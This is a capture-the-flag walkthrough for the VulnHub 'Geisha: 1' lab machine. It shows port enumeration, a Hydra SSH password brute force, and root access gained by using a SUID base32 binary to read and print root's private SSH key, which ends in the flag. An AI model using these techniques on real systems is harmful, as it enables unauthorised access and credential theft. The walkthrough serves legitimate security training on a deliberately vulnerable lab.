# VulnHub > Geisha 1

**About Release**

* Name: Geisha: 1
* Date release: 13 May 2020
* Author: SunCSR Team
* Series: Geisha
* Difficulty: Beginner to Intermediate
* Tested: VMware Workstation 15.x Pro & VirtualBox 6.x (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell and then obtain flag under `/root`. Warning: Be careful with "rabbit hole".

**Download**

* Geisha.zip (Size: 1.5 GB)
* Download: https://drive.google.com/file/d/1IYk6CVInUzW6U-m3fn_w8xN4mgBLPf9K%
* Download (Mirror): https://download.vulnhub.com/geisha/Geisha.zip
* Download (Torrent): https://download.vulnhub.com/geisha/Geisha.zip.torrent ([Magnet](magnet:?xt=urn:btih:EF3B731333FB988A7CB705CA11F490DE45C59071&dn=Geisha.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Services Enumeration

There are many open ports, including FTP, SSH, and several Web services.

~~~
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Geisha
7080/tcp open  ssl/http LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
|_ssl-date: 2020-10-01T05:50:07+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7125/tcp open  http     nginx 1.17.10
|_http-server-header: nginx/1.17.10
|_http-title: Geisha
8088/tcp open  http     LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
|_http-title: Geisha
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

There are many web servers, which will make you loose a lot of time enumerating hidden locations, but none is really interesting. All you need to know is that there is a `passwd` file that confirms the existence of a `geisha` account.

* On port 80, `gobuster` doesn't reveal interesting resources (there is a `info.php` file but it only outputs `1`).
* Port 7080 also contains hidden resources (`/admin.php`, `/docs`, `info.php`, `phpinfo.php`, ...) but no resource brings value. 
* Port 7125 hosts `/passwd` and `/shadow` files, but the `shadow` file can't be read due to insufficient permissions. The `passwd` file reveals the existence of a `geisha` account.

~~~
kali@kali:/data/Geisha_1$ curl -s http://geisha.box:7125/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
~~~

* On port 8088, we also find some resources (`/blocked`, `/cgi-bin`, `info.php`, ...) but nothing interesting.
* Port 9198 hosts a `info.php` file which doesn't bring value either.

# Brute force the `geisha` account

After failing to brute force `geisha`'s FTP password, I eventually succeeded in discovering the SSH password.

~~~
kali@kali:~$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://geisha.box -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-01 08:48:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://geisha.box:22/
[22][ssh] host: geisha.box   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 63 final worker threads did not complete until end.
[ERROR] 63 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-01 08:49:37
~~~

# SSH

We can now connect as `geisha` using SSH:

~~~
kali@kali:~$ sshpass -p "letmein" ssh geisha@geisha.box
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  1 02:48:07 2020 from 172.16.222.128
geisha@geisha:~$ id
uid=1000(geisha) gid=1000(geisha) groups=1000(geisha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
geisha@geisha:~$ 
~~~

# Privilege escalation

Listing files owned by `root` with the `SUID` bit set, we find that `base32` is part of the list:

~~~
geisha@geisha:~$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32 <------- interesting!
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/base32/), we confirm that we can read arbitrary files as root:

~~~
LFILE=file_to_read
base32 "$LFILE" | base32 --decode
~~~

After failing to read `/root/root.txt` (file doesn't exist), I was able to find that SSH permits connection as `root` and found the `root` SSH private key:

~~~
geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----
~~~

Save the file locally, give it appropriate privileges and connect as `root`:

~~~
kali@kali:/data/Geisha_1/files$ chmod 400 root.key 
kali@kali:/data/Geisha_1/files$ ssh -i root.key root@geisha.box
load pubkey "root.key": invalid format
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May  9 12:03:57 2020 from 192.168.1.21
root@geisha:~# pwd
/root
~~~

# Root flag

We can now read the root flag:

~~~
root@geisha:~# ls -la
total 32
drwx------  4 root root 4096 Oct  1 02:00 .
drwxr-xr-x 18 root root 4096 May  3 01:39 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   27 May  9 11:35 flag.txt
drwxr-xr-x  3 root root 4096 May  9 10:03 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 May  9 11:45 .selected_editor
drwxr-xr-x  2 root root 4096 May  9 11:36 .ssh
root@geisha:~# cat flag.txt
Flag{Sun_CTF_220_5_G31sha}
root@geisha:~# 
~~~
